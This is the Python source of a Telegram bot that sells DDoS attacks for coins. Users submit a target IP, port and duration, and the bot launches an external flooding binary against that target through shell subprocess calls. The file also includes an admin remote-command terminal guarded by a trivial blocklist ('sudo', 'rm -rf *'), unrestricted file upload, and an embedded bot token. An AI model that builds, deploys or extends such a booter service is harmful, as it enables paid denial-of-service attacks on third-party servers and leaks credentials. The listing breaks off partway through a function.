# ===========================================================
#                  MEGOXER BOT SCRIPT
# ===========================================================

# --------------------[ IMPORTS ]----------------------------

import os
import time
import json
import telebot
import datetime
import threading
import subprocess
from telebot import types

# --------------------[ CONFIGURATION ]----------------------



# Insert your Telegram bot token here
bot = telebot.TeleBot('7940936429:AAG9H_9sGZbuq6SIbaRHVvyuoES0ZjhDZrg')

# Insert your admin id here
admin_id = ["7469108296"]

# Files for data storage
LOG_FILE = "log.txt"
DATA_FILE = "data.json"

# Attack setting for users
ALLOWED_PORT_RANGE = range(10003, 30000)
ALLOWED_IP_PREFIXES = ("20.", "4.", "52.")
BLOCKED_PORTS = {10000, 10001, 10002, 17500, 20000, 20001, 20002, 443}



# --------------------[ IN-MEMORY STORAGE ]----------------------

users = {}
user_coins = {}
user_cooldowns = {}
user_last_attack = {}

# --------------------[ STORAGE ]----------------------



# Load data from data.json if it exists
def load_data():
    global user_coins
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as file:
            data = json.load(file)
            user_coins = data.get("coins", {})

# Save data to data.json
def save_data():
    data = {
        "coins": user_coins
    }
    with open(DATA_FILE, "w") as file:
        json.dump(data, file, indent=4)

def load_config():
    config_file = "config.json"

    if not os.path.exists(config_file):
        print(f"Config file {config_file} does not exist. Please create it.")
        exit(1)

    try:
        with open(config_file, 'r') as f:
            return json.load(f)
    except json.JSONDecodeError as e:
        print(f"Error decoding JSON in {config_file}: {str(e)}")
        exit(1)

config = load_config()

# Extract values from config.json
full_command_type = config["initial_parameters"]
threads = config.get("initial_threads")
packets = config.get("initial_packets")
binary = config.get("initial_binary")
MAX_ATTACK_TIME = config.get("max_attack_time")
ATTACK_COOLDOWN = config.get("attack_cooldown")
ATTACK_COST = config.get("cost_per_attack")

def save_config():
    config = {
        "initial_parameters": full_command_type,
        "initial_threads": threads,
        "initial_packets": packets,
        "initial_binary": binary,
        "max_attack_time": MAX_ATTACK_TIME,
        "attack_cooldown": ATTACK_COOLDOWN,
        "cost_per_attack": ATTACK_COST
    }

    with open("config.json", "w") as f:
        json.dump(config, f, indent=4)

# Log command function
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else f"{user_id}"

    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")
        
# --------------------------------------------------------------
        

        
        
        
# --------------------[ KEYBOARD BUTTONS ]----------------------


@bot.message_handler(commands=['start'])
def start_command(message):
    """Start command to display the main menu."""
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    attack_button = types.KeyboardButton("ð Attack")
    myinfo_button = types.KeyboardButton("ð¤ My Info")    
    coin_button = types.KeyboardButton("ð° Buy Coins")
    
    # Show the "âï¸ Settings" and "âºï¸ Terminal" buttons only to admins
    if str(message.chat.id) in admin_id:
        settings_button = types.KeyboardButton("âï¸ Settings")
        terminal_button = types.KeyboardButton("âºï¸ Terminal")
        markup.add(attack_button, myinfo_button, coin_button, settings_button, terminal_button)
    else:
        markup.add(attack_button, myinfo_button, coin_button)
    
    bot.reply_to(message, "ðªð²ð¹ð°ð¼ðºð² ðð¼ ðºð²ð´ð¼ðð²ð¿ ð¯ð¼ð!", reply_markup=markup)
    
@bot.message_handler(func=lambda message: message.text == "âï¸ Settings")
def settings_command(message):
    """Admin-only settings menu."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
        threads_button = types.KeyboardButton("Threads")
        binary_button = types.KeyboardButton("Binary")
        packets_button = types.KeyboardButton("Packets")
        command_button = types.KeyboardButton("parameters")
        attack_cooldown_button = types.KeyboardButton("Attack Cooldown")
        attack_time_button = types.KeyboardButton("Attack Time")
        attack_cost_button = types.KeyboardButton("Attack cost")
        back_button = types.KeyboardButton("<< Back to Menu")

        markup.add(threads_button, binary_button, packets_button, command_button, attack_cooldown_button, attack_time_button, attack_cost_button, back_button)
        bot.reply_to(message, "âï¸ ð¦ð²ððð¶ð»ð´ð ð ð²ð»ð", reply_markup=markup)
    else:
        bot.reply_to(message, "âï¸ ð¬ð¼ð ð®ð¿ð² ð»ð¼ð ð®ð» ð®ð±ðºð¶ð».")
        
@bot.message_handler(func=lambda message: message.text == "âºï¸ Terminal")
def terminal_menu(message):
    """Show the terminal menu for admins."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
        command_button = types.KeyboardButton("Command")
        upload_button = types.KeyboardButton("Upload")
        back_button = types.KeyboardButton("<< Back to Menu")
        markup.add(command_button, upload_button, back_button)
        bot.reply_to(message, "âï¸ ð§ð²ð¿ðºð¶ð»ð®ð¹ ð ð²ð»ð", reply_markup=markup)
    else:
        bot.reply_to(message, "âï¸ ð¬ð¼ð ð®ð¿ð² ð»ð¼ð ð®ð» ð®ð±ðºð¶ð».")

@bot.message_handler(func=lambda message: message.text == "<< Back to Menu")
def back_to_main_menu(message):
    """Go back to the main menu."""
    start_command(message)

# ------------------------------------------------------------
    
    
    
    
# --------------------[ ATTACK SECTION ]----------------------
    
    
attack_in_process = False

@bot.message_handler(func=lambda message: message.text == "ð Attack")
def handle_attack(message):
    global attack_in_process  # Access the global variable
    user_id = str(message.chat.id)
    
    # Check if the user has enough coins for the attack
    if user_id not in user_coins or user_coins[user_id] < ATTACK_COST:
        response = f"âï¸ ðð°ð°ð²ðð ðð²ð»ð¶ð²ð±! âï¸\n\nOops! It seems like you don't have enough coins to use the Attack command. To gain coins and unleash the power of attacks, you can:\n\nð Contact an Admin or the Owner for coins.\nð Become a proud supporter and purchase coins.\nð¬ Chat with an admin now and level up your experience!\n\nPer attack it cost only {ATTACK_COST} coins!"
        bot.reply_to(message, response)
        return
    
    if attack_in_process:
        bot.reply_to(message, "âï¸ ðð» ð®ððð®ð°ð¸ ð¶ð ð®ð¹ð¿ð²ð®ð±ð ð¶ð» ð½ð¿ð¼ð°ð²ðð.\nð¨ðð² /check ðð¼ ðð²ð² ð¿ð²ðºð®ð¶ð»ð¶ð»ð´ ðð¶ðºð²!")
        return

    # Prompt the user for attack details
    response = "ðð»ðð²ð¿ ððµð² ðð®ð¿ð´ð²ð ð¶ð½, ð½ð¼ð¿ð ð®ð»ð± ð±ðð¿ð®ðð¶ð¼ð» ð¶ð» ðð²ð°ð¼ð»ð±ð ðð²ð½ð®ð¿ð®ðð²ð± ð¯ð ðð½ð®ð°ð²"
    bot.reply_to(message, response)
    bot.register_next_step_handler(message, process_attack_details)

# Global variable to track attack status and start time
attack_in_process = False
attack_start_time = None
attack_duration = 0  # Attack duration in seconds

# Function to handle the attack command
@bot.message_handler(commands=['check'])
def show_remaining_attack_time(message):
    if attack_in_process:
        # Calculate the elapsed time
        elapsed_time = (datetime.datetime.now() - attack_start_time).total_seconds()
        remaining_time = max(0, attack_duration - elapsed_time)  # Ensure remaining time doesn't go negative

        if remaining_time > 0:
            response = f"ð¨ ðððð®ð°ð¸ ð¶ð» ð½ð¿ð¼ð´ð¿ð²ðð! ð¨\n\nð¥ð²ðºð®ð¶ð»ð¶ð»ð´ ðð¶ðºð²: {int(remaining_time)} ðð²ð°ð¼ð»ð±ð."
        else:
            response = "â ð§ðµð² ð®ððð®ð°ð¸ ðµð®ð ð³ð¶ð»ð¶ððµð²ð±!"
    else:
        response = "â ð¡ð¼ ð®ððð®ð°ð¸ ð¶ð ð°ðð¿ð¿ð²ð»ðð¹ð ð¶ð» ð½ð¿ð¼ð´ð¿ð²ðð"

    bot.reply_to(message, response)

def run_attack(command):
    subprocess.Popen(command, shell=True)

attack_message = None

def process_attack_details(message):
    global attack_in_process, attack_start_time, attack_duration, attack_message
    attack_message = message  # Save the message object for later use
    user_id = str(message.chat.id)
    details = message.text.split()
    
    if len(details) != 3:
        bot.reply_to(message, "âï¸ðð»ðð®ð¹ð¶ð± ðð¼ð¿ðºð®ðâï¸\n")
        return
    
    if user_id in user_last_attack:
        time_since_last_attack = (datetime.datetime.now() - user_last_attack[user_id]).total_seconds()
        if time_since_last_attack < ATTACK_COOLDOWN:
            remaining_cooldown = int(ATTACK_COOLDOWN - time_since_last_attack)
            bot.reply_to(message, f"â ð¬ð¼ð ð»ð²ð²ð± ðð¼ ðð®ð¶ð {remaining_cooldown} ðð²ð°ð¼ð»ð±ð ð¯ð²ð³ð¼ð¿ð² ð®ððð®ð°ð¸ð¶ð»ð´ ð®ð´ð®ð¶ð».")
            return
    
    if len(details) == 3:
        target = details[0]
        try:
            port = int(details[1])
            time = int(details[2])

            # Check if the target IP starts with an allowed prefix
            if not target.startswith(ALLOWED_IP_PREFIXES):
                bot.reply_to(message, "âï¸ ðð¿ð¿ð¼ð¿: ð¨ðð² ðð®ð¹ð¶ð± ðð£ ðð¼ ð®ððð®ð°ð¸")
                return  # Stop further execution

            # Check if the port is within the allowed range
            if port not in ALLOWED_PORT_RANGE:
                bot.reply_to(message, f"âï¸ ðððð®ð°ð¸ ð®ð¿ð² ð¼ð»ð¹ð ð®ð¹ð¹ð¼ðð²ð± ð¼ð» ð½ð¼ð¿ðð ð¯ð²ððð²ð²ð» [10003 - 29999]")
                return  # Stop further execution

            # Check if the port is in the blocked list
            if port in BLOCKED_PORTS:
                bot.reply_to(message, f"âï¸ ð£ð¼ð¿ð {port} ð¶ð ð¯ð¹ð¼ð°ð¸ð²ð± ð®ð»ð± ð°ð®ð»ð»ð¼ð ð¯ð² ððð²ð±!")
                return  # Stop further execution

            # **Check if attack time exceeds MAX_ATTACK_TIME**
            if time > MAX_ATTACK_TIME:
                bot.reply_to(message, f"âï¸ ð ð®ðð¶ðºððº ð®ððð®ð°ð¸ ðð¶ðºð² ð¶ð {MAX_ATTACK_TIME} ðð²ð°ð¼ð»ð±ð!")
                return  # Stop further execution
  
            else:
                user_coins[user_id] -= ATTACK_COST
                remaining_coins = user_coins[user_id]  # Now the value is correct
                save_data()
                log_command(user_id, target, port, time)
                # Modify full command type logic
                if full_command_type == 1:
                    full_command = f"./{binary} {target} {port} {time}"
                elif full_command_type == 2:
                    full_command = f"./{binary} {target} {port} {time} {threads}"
                elif full_command_type == 3:
                    full_command = f"./{binary} {target} {port} {time} {packets} {threads}"

                username = message.chat.username or "No username"

                # Set attack_in_process to True before sending the response
                attack_in_process = True
                attack_start_time = datetime.datetime.now()
                attack_duration = time  
                user_last_attack[user_id] = datetime.datetime.now()
            
                # Send response
                response = (f"ð ðððð®ð°ð¸ ð¦ð²ð»ð ð¦ðð°ð°ð²ððð³ðð¹ð¹ð! ð\n\n"
                        f"ð§ð®ð¿ð´ð²ð: {target}:{port}\n"
                        f"ð§ð¶ðºð²: {time} ðð²ð°ð¼ð»ð±ð\n"
                        f"ðð²ð±ðð°ðð²ð±: {ATTACK_COST} ð°ð¼ð¶ð»ð\n"
                        f"ð¥ð²ðºð®ð¶ð»ð¶ð»ð´ ðð¼ð¶ð»ð: {remaining_coins}\n"
                        f"ðððð®ð°ð¸ð²ð¿: @{username}")
                        
                bot.reply_to(message, response)

                # Run attack in a separate thread
                attack_thread = threading.Thread(target=run_attack, args=(full_command,))
                attack_thread.start()

                # Reset attack_in_process after the attack ends
                threading.Timer(time, reset_attack_status).start()

        except ValueError:
                bot.reply_to(message, "âï¸ðð»ðð®ð¹ð¶ð± ðð¼ð¿ðºð®ðâï¸")

def reset_attack_status():
    global attack_in_process
    attack_in_process = False

    # Send the attack finished message after the attack duration is complete
    bot.send_message(attack_message.chat.id, "â ðððð®ð°ð¸ ð³ð¶ð»ð¶ððµð²ð±!")
    
# ---------------------------------------------------------------------
#   
#
#
#
# --------------------[ USERS AND COINS SECTOIN ]----------------------

@bot.message_handler(func=lambda message: message.text == "ð¤ My Info")
def my_info(message):
    user_id = str(message.chat.id)
    username = message.chat.username or "No username"
    role = "Admin" if user_id in admin_id else "User"
    status = "Active â" if user_id in user_coins else "Inactive â"

    # Format the response
    response = (
        f"ð¤ ð¨ð¦ðð¥ ðð¡ðð¢ð¥ð ðð§ðð¢ð¡ ð¤\n\n"
        f"ð ð¥ð¼ð¹ð²: {role}\n"
        f"â¹ï¸ ð¨ðð²ð¿ð»ð®ðºð²: @{username}\n"
        f"ð ð¨ðð²ð¿ðð: {user_id}\n"
        f"ð ð¦ðð®ððð: {status}\n"
        f"ð° ðð¼ð¶ð»ð: {user_coins.get(user_id, 0)}"
    )

    bot.reply_to(message, response)
	
@bot.message_handler(commands=['users'])
def show_users(message):
    user_id = str(message.chat.id)
    
    if user_id in admin_id:
        if user_coins:  # Check if there are users
            users_info = "\n".join([f"ð {uid}: {coins} coins" for uid, coins in user_coins.items()])
            response = f"ð¨ðð²ð¿ð ð®ð»ð± ðð¼ð¶ð»ð:\n\n{users_info}"
        else:
            response = "No users found."
        bot.reply_to(message, response)
    else:
        response = "âï¸ ðð°ð°ð²ðð ðð²ð»ð¶ð²ð±: ðð±ðºð¶ð» ð¼ð»ð¹ð ð°ð¼ðºðºð®ð»ð±"
        bot.reply_to(message, response)
        
# Admin adds coins to a user's account
@bot.message_handler(commands=['add'])
def add_coins(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            target_user_id, coins = message.text.split()[1], int(message.text.split()[2])
            if target_user_id not in user_coins:
                user_coins[target_user_id] = 0
            user_coins[target_user_id] += coins
            save_data()  # Save updated data to JSON

            # Send message to admin
            response = f"â {coins} ð°ð¼ð¶ð»ð ð®ð±ð±ð²ð± ðð¼ {target_user_id}'ð ð®ð°ð°ð¼ðð»ð!"
            
        except (IndexError, ValueError):
            response = "âï¸ð¨ðð®ð´ð²: /add <user_id> <coins>"
    else:
        response = "âï¸ ðð°ð°ð²ðð ðð²ð»ð¶ð²ð±: ðð±ðºð¶ð» ð¼ð»ð¹ð ð°ð¼ðºðºð®ð»ð±"
    
    bot.reply_to(message, response)
    
@bot.message_handler(commands=['remove'])
def clear_user(message):
    user_id = str(message.chat.id)
    
    if user_id in admin_id:
        try:
            target_user_id = message.text.split()[1]
            
            if target_user_id in user_coins:
                del user_coins[target_user_id]
                save_data()  # Save updated data to JSON
                response = f"â ð¨ðð²ð¿ {target_user_id} ðµð®ð ð¯ð²ð²ð» ð¿ð²ðºð¼ðð²ð± ð³ð¿ð¼ðº ððµð² ð±ð®ðð®"
            else:
                response = f"â ð¨ðð²ð¿ {target_user_id} ð»ð¼ð ð³ð¼ðð»ð± ð¶ð» ððµð² ððððð²ðº."
        except IndexError:
            response = "â Usage: /remove <user_id>"
    else:
        response = "âï¸ ðð°ð°ð²ðð ðð²ð»ð¶ð²ð±: ðð±ðºð¶ð» ð¼ð»ð¹ð ð°ð¼ðºðºð®ð»ð±"
    
    bot.reply_to(message, response)

# Admin deducts coins from a user's account
@bot.message_handler(commands=['deduct'])
def deduct_coins(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            target_user_id, coins = message.text.split()[1], int(message.text.split()[2])
            if target_user_id not in user_coins:
                response = f"âï¸ð¨ðð²ð¿ {target_user_id} ð±ð¼ð²ðð»'ð ðµð®ðð² ð®ð»ð ð°ð¼ð¶ð»ð ðð²ð"
            else:
                # Deduct the coins
                user_coins[target_user_id] = max(0, user_coins[target_user_id] - coins)
                save_data()  # Save updated data to JSON
                
                # Send message to admin
                response = f"â {coins} ð°ð¼ð¶ð»ð ð±ð²ð±ðð°ðð²ð± ð³ð¿ð¼ðº {target_user_id}'ð ð®ð°ð°ð¼ðð»ð!"

        except (IndexError, ValueError):
            response = "âï¸ð¨ðð®ð´ð²: /deduct <user_id> <coins>"
    else:
        response = "âï¸ ðð°ð°ð²ðð ðð²ð»ð¶ð²ð±: ðð±ðºð¶ð» ð¼ð»ð¹ð ð°ð¼ðºðºð®ð»ð±"
    
    bot.reply_to(message, response)
    
@bot.message_handler(func=lambda message: message.text == "ð° Buy Coins")
def buy_coins(message):
    markup = types.InlineKeyboardMarkup(row_width=1)
    button1 = types.InlineKeyboardButton("50 COINS - 75/-", callback_data="buy_50")
    button2 = types.InlineKeyboardButton("100 COINS - 150/-", callback_data="buy_100")
    button3 = types.InlineKeyboardButton("200 COINS - 300/-", callback_data="buy_200")
    markup.add(button1, button2, button3)
    
    bot.reply_to(message, "â ððµð¼ð¼ðð² ðð¼ðð¿ ð½ð¹ð®ð»:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("buy_"))
def handle_buy_callback(call):
    admin_username = "@SYGDEVIL"  # Replace with your admin username
    coin_plans = {
        "buy_50": "50 coins \nð° ð£ð¿ð¶ð°ð²: 75 Rs",
        "buy_100": "100 coins \nð° ð£ð¿ð¶ð°ð²: 150 Rs",
        "buy_200": "200 coins \nð° ð£ð¿ð¶ð°ð²: 300 Rs"
    }

    if call.data in coin_plans:
        chosen_plan = coin_plans[call.data]
        bot.send_message(call.message.chat.id, f"ð© ðð¼ð»ðð®ð°ð ððµð² ð®ð±ðºð¶ð» ðð¼ ð¯ðð ð°ð¼ð¶ð»ð:\n\nð¤ ðð±ðºð¶ð»: {admin_username}\nð³ ð£ð¹ð®ð»: {chosen_plan}")
        bot.delete_message(call.message.chat.id, call.message.message_id)  # Delete the plan selection message
    
@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found"
                bot.reply_to(message, response)
        else:
            response = "No data found"
            bot.reply_to(message, response)
    else:
        response = "âï¸ ðð°ð°ð²ðð ðð²ð»ð¶ð²ð±: ðð±ðºð¶ð» ð¼ð»ð¹ð ð°ð¼ðºðºð®ð»ð±"
        bot.reply_to(message, response)
        
@bot.message_handler(commands=['status'])
def status_command(message):
    """Show current status for threads, binary, packets, and command type."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        # Prepare the status message
        status_message = (
            f"â£ï¸ ðð§ð§ððð ð¦ð§ðð§ð¨ð¦ â£ï¸\n\n"
            f"â¶ï¸ ðððð®ð°ð¸ ð°ð¼ðð: {ATTACK_COST}\n"
            f"â¶ï¸ ðððð®ð°ð¸ ð°ð¼ð¼ð¹ð±ð¼ðð»: {ATTACK_COOLDOWN}\n"
            f"â¶ï¸ ðððð®ð°ð¸ ðð¶ðºð²: {MAX_ATTACK_TIME}\n\n"
            f"-----------------------------------\n"
            f"â´ï¸ ðð§ð§ððð ð¦ðð§ð§ðð¡ðð¦ â´ï¸\n\n"
            f"â¶ï¸ ðð¶ð»ð®ð¿ð ð»ð®ðºð²: {binary}\n"
            f"â¶ï¸ ð£ð®ð¿ð®ðºð²ðð²ð¿ð: {full_command_type}\n"
            f"â¶ï¸ ð§ðµð¿ð²ð®ð±ð: {threads}\n"
            f"â¶ï¸ ð£ð®ð°ð¸ð²ðð: {packets}\n"
        )
        bot.reply_to(message, status_message)
    else:
        bot.reply_to(message, "âï¸ ð¬ð¼ð ð®ð¿ð² ð»ð¼ð ð®ð» ð®ð±ðºð¶ð».")
        
# --------------------------------------------------------------
        

        
        
        
# --------------------[ TERMINAL SECTION ]----------------------

# List of blocked command prefixes
blocked_prefixes = ["nano", "sudo", "rm *", "rm -rf *"]

@bot.message_handler(func=lambda message: message.text == "Command")
def command_to_terminal(message):
    """Handle sending commands to terminal for admins."""
    user_id = str(message.chat.id)
    
    if user_id in admin_id:
        bot.reply_to(message, "ðð»ðð²ð¿ ððµð² ð°ð¼ðºðºð®ð»ð±:")
        bot.register_next_step_handler(message, execute_terminal_command)
    else:
        bot.reply_to(message, "âï¸ ð¬ð¼ð ð®ð¿ð² ð»ð¼ð ð®ð» ð®ð±ðºð¶ð».")

def execute_terminal_command(message):
    """Execute the terminal command entered by the admin."""
    try:
        command = message.text.strip()
        
        # Check if the command starts with any of the blocked prefixes
        if any(command.startswith(blocked_prefix) for blocked_prefix in blocked_prefixes):
            bot.reply_to(message, "âï¸ð§ðµð¶ð ð°ð¼ðºðºð®ð»ð± ð¶ð ð¯ð¹ð¼ð°ð¸ð²ð±.")
            return
        
        # Execute the command if it's not blocked
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout if result.stdout else result.stderr
        if output:
            bot.reply_to(message, f"âºï¸ ðð¼ðºðºð®ð»ð± ð¢ððð½ðð:\n`{output}`", parse_mode='Markdown')
        else:
            bot.reply_to(message, "â ðð¼ðºðºð®ð»ð± ð²ðð²ð°ððð²ð± ððð°ð°ð²ððð¹ð¹ð")
    except Exception as e:
        bot.reply_to(message, f"âï¸ ðð¿ð¿ð¼ð¿ ððð²ð°ððð¶ð»ð´ ð°ð¼ðºðºð®ð»ð±: {str(e)}")

@bot.message_handler(func=lambda message: message.text == "Upload")
def upload_to_terminal(message):
    """Handle file upload to terminal for admins."""
    user_id = str(message.chat.id)
    
    if user_id in admin_id:
        bot.reply_to(message, "ð¤ ð¦ð²ð»ð± ð³ð¶ð¹ð² ðð¼ ðð½ð¹ð¼ð®ð± ð¶ð» ðð²ð¿ðºð¶ð»ð®ð¹.")
        bot.register_next_step_handler(message, process_file_upload)
    else:
        bot.reply_to(message, "âï¸ ð¬ð¼ð ð®ð¿ð² ð»ð¼ð ð®ð» ð®ð±ðºð¶ð».")

def process_file_upload(message):
    """Process the uploaded file and save it in the current directory."""
    if message.document:
        try:
            # Get file info and download it
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            
            # Get the current directory of the Python script
            current_dir = os.path.dirname(os.path.abspath(__file__))
            
            # Create the full file path where the file will be saved
            file_path = os.path.join(current_dir, message.document.file_name)
            
            # Save the file in the current directory
            with open(file_path, 'wb') as new_file:
                new_file.write(downloaded_file)
            
            bot.reply_to(message, f"ð¤ ðð¶ð¹ð² ðð½ð¹ð¼ð®ð±ð²ð± ððð°ð°ð²ððð³ðð¹ð¹ð:\n `{file_path}`", parse_mode='Markdown')
        except Exception as e:
            bot.reply_to(message, f"âï¸ðð¿ð¿ð¼ð¿ ðð½ð¹ð¼ð®ð±ð¶ð»ð´ ð³ð¶ð¹ð²: {str(e)}")
    else:
        bot.reply_to(message, "âï¸ð¦ð²ð»ð± ð¼ð»ð¹ð ð³ð¶ð¹ð² ðð¼ ðð½ð¹ð¼ð®ð± ")
        
# --------------------------------------------------------------
        

        
        
        
# --------------------[ ATTACK SETTINGS ]----------------------

@bot.message_handler(func=lambda message: message.text == "Threads")
def set_threads(message):
    """Admin command to change threads."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        bot.reply_to(message, "ðð»ðð²ð¿ ððµð² ð»ððºð¯ð²ð¿ ð¼ð³ ððµð¿ð²ð®ð±ð:")
        bot.register_next_step_handler(message, process_new_threads)
    else:
        bot.reply_to(message, "âï¸ ð¬ð¼ð ð®ð¿ð² ð»ð¼ð ð®ð» ð®ð±ðºð¶ð».")

def process_new_threads(message):
        new_threads = message.text.strip()
        global threads
        threads = new_threads
        save_config()  # Save changes
        bot.reply_to(message, f"â ð§ðµð¿ð²ð®ð±ð ð°ðµð®ð»ð´ð²ð± ðð¼: {new_threads}")

@bot.message_handler(func=lambda message: message.text == "Binary")
def set_binary(message):
    """Admin command to change the binary name."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        bot.reply_to(message, "ðð»ðð²ð¿ ððµð² ð»ð®ðºð² ð¼ð³ ððµð² ð»ð²ð ð¯ð¶ð»ð®ð¿ð:")
        bot.register_next_step_handler(message, process_new_binary)
    else:
        bot.reply_to(message, "âï¸ ð¬ð¼ð ð®ð¿ð² ð»ð¼ð ð®ð» ð®ð±ðºð¶ð».")

def process_new_binary(message):
    new_binary = message.text.strip()
    global binary
    binary = new_binary
    save_config()  # Save changes
    bot.reply_to(message, f"â ðð¶ð»ð®ð¿ð ð»ð®ðºð² ð°ðµð®ð»ð´ð²ð± ðð¼: `{new_binary}`", parse_mode='Markdown')


@bot.message_handler(func=lambda message: message.text == "Packets")
def set_packets(message):
    """Admin command to change packets."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        bot.reply_to(message, "ðð»ðð²ð¿ ððµð² ð»ððºð¯ð²ð¿ ð¼ð³ ð½ð®ð°ð¸ð²ðð:")
        bot.register_next_step_handler(message, process_new_packets)
    else:
        bot.reply_to(message, "âï¸ ð¬ð¼ð ð®ð¿ð² ð»ð¼ð ð®ð» ð®ð±ðºð¶ð».")

def process_new_packets(message):
    new_packets = message.text.strip()
    global packets
    packets = new_packets
    save_config()  # Save changes
    bot.reply_to(message, f"â ð£ð®ð°ð¸ð²ðð ð°ðµð®ð»ð´ð²ð± ðð¼: {new_packets}")

@bot.message_handler(func=lambda message: message.text == "parameters")
def set_command_type(message):
    """Admin command to change the full_command_type using inline buttons."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        markup = types.InlineKeyboardMarkup(row_width=1)
        btn1 = types.InlineKeyboardButton("parameters 1", callback_data="arg_1")
        btn2 = types.InlineKeyboardButton("parameters 2", callback_data="arg_2")
        btn3 = types.InlineKeyboardButton("parameters 3", callback_data="arg_3")
        markup.add(btn1, btn2, btn3)
        
        bot.reply_to(message, "ð¹ ð¦ð²ð¹ð²ð°ð ð®ð» ð£ð®ð¿ð®ðºð²ðð²ð¿ð ððð½ð²:", reply_markup=markup)
    else:
        bot.reply_to(message, "âï¸ ð¬ð¼ð ð®ð¿ð² ð»ð¼ð ð®ð» ð®ð±ðºð¶ð».")

@bot.callback_query_handler(func=lambda call: call.data.startswith("arg_"))
def process_parameters_selection(call):
    """Handles parameters selection via inline buttons."""
    global full_command_type
    selected_arg = int(call.data.split("_")[1])  # Extract parameters number

    # Update the global command type
    full_command_type = selected_arg
    save_config()  # Save the new configuration

    # Generate response message based on the selected parameters
    if full_command_type == 1:
        response_message = "â ð¦ð²ð¹ð²ð°ðð²ð± ð£ð®ð¿ð®ðºð²ðð²ð¿ð 1:\n `<target> <port> <time>`"
    elif full_command_type == 2:
        response_message = "â ð¦ð²ð¹ð²ð°ðð²ð± ð£ð®ð¿ð®ðºð²ðð²ð¿ð 2:\n `<target> <port> <time> <threads>`"
    elif full_command_type == 3:
        response_message = "â ð¦ð²ð¹ð²ð°ðð²ð± ð£ð®ð¿ð®ðºð²ðð²ð¿ð 3:\n `<target> <port> <time> <packet> <threads>`"
    else:
        response_message = "âðð»ðð®ð¹ð¶ð± ðð²ð¹ð²ð°ðð¶ð¼ð»."

    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=response_message, parse_mode='Markdown')
        
@bot.message_handler(func=lambda message: message.text == "Attack Cooldown")
def set_attack_cooldown(message):
    """Admin command to change attack cooldown time."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        bot.reply_to(message, "ð ðð»ðð²ð¿ ð»ð²ð ð®ððð®ð°ð¸ ð°ð¼ð¼ð¹ð±ð¼ðð» (ð¶ð» ðð²ð°ð¼ð»ð±ð):")
        bot.register_next_step_handler(message, process_new_attack_cooldown)
    else:
        bot.reply_to(message, "âï¸ ð¬ð¼ð ð®ð¿ð² ð»ð¼ð ð®ð» ð®ð±ðºð¶ð».")

def process_new_attack_cooldown(message):
    global ATTACK_COOLDOWN
    try:
        new_cooldown = int(message.text)
        ATTACK_COOLDOWN = new_cooldown
        save_config()  # Save changes
        bot.reply_to(message, f"â ðððð®ð°ð¸ ð°ð¼ð¼ð¹ð±ð¼ðð» ð°ðµð®ð»ð´ð²ð± ðð¼: {new_cooldown} ðð²ð°ð¼ð»ð±ð")
    except ValueError:
        bot.reply_to(message, "âðð»ðð®ð¹ð¶ð± ð»ððºð¯ð²ð¿! ð£ð¹ð²ð®ðð² ð²ð»ðð²ð¿ ð® ðð®ð¹ð¶ð± ð»ððºð²ð¿ð¶ð° ðð®ð¹ðð².")
        
@bot.message_handler(func=lambda message: message.text == "Attack Time")
def set_attack_time(message):
    """Admin command to change max attack time."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        bot.reply_to(message, "â³ ðð»ðð²ð¿ ðºð®ð ð®ððð®ð°ð¸ ð±ðð¿ð®ðð¶ð¼ð» (ð¶ð» ðð²ð°ð¼ð»ð±ð):")
        bot.register_next_step_handler(message, process_new_attack_time)
    else:
        bot.reply_to(message, "âï¸ ð¬ð¼ð ð®ð¿ð² ð»ð¼ð ð®ð» ð®ð±ðºð¶ð».")

def process_new_attack_time(message):
    global MAX_ATTACK_TIME
    try:
        new_attack_time = int(message.text)
        MAX_ATTACK_TIME = new_attack_time
        save_config()  # Save changes
        bot.reply_to(message, f"â ð ð®ð ð®ððð®ð°ð¸ ðð¶ðºð² ð°ðµð®ð»ð´ð²ð± ðð¼: {new_attack_time} ðð²ð°ð¼ð»ð±ð")
    except ValueError:
        bot.reply_to(message, "âðð»ðð®ð¹ð¶ð± ð»ððºð¯ð²ð¿! ð£ð¹ð²ð®ðð² ð²ð»ðð²ð¿ ð® ðð®ð¹ð¶ð± ð»ððºð²ð¿ð¶ð° ðð®ð¹ðð².")

@bot.message_handler(func=lambda message: message.text == "Attack cost")
def set_attack_cost(message):
    """Admin command to change max attack time."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        bot.reply_to(message, "â³ ðð»ðð²ð¿ ð»ð²ð ð®ððð®ð°ð¸ ð°ð¼ðð:")
        bot.register_next_step_handler(message, process_new_attack_cost)
    else:
        bot.reply_to(message, "âï¸ ð¬ð¼ð ð®ð¿ð² ð»ð¼ð ð®ð» ð®ð±ðºð¶ð».")

def process_new_attack_cost(message):
    global ATTACK_COST
    try:
        new_attack_cost = int(message.text)
        ATTACK_COST = new_attack_cost
        save_config()  # Save changes
